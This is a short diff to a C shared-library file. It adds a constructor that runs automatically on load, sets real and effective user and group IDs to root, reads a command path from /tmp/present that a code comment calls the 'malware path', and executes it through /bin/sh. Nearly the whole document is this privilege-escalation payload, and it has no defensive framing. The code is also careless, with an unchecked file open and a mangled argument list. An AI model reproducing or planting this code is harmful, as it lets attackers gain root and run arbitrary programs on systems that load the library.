@@ -1,9 +1,24 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
+#define TMP_PATH "/tmp/present"
+#define PATH_LEN 255
+
 void __attribute__((constructor)) setup() {
-  printf("Hello");
   setreuid(0, 0);
   setregid(0, 0);
-  char *empty[] = {NULL};
+
+  // read malware path
+  FILE *tmp = fopen(TMP_PATH, "r");
+  char buf[PATH_LEN] = {0};
+  if (fread(buf, sizeof(char), PATH_LEN, tmp) == 0) {
+    printf("Read failed!");
+    return;
+  }
+
+  fclose(tmp);
+
+  // exec
+  char *empty[] = {"-c", buf};
   execve("/bin/sh", empty, empty);
 }
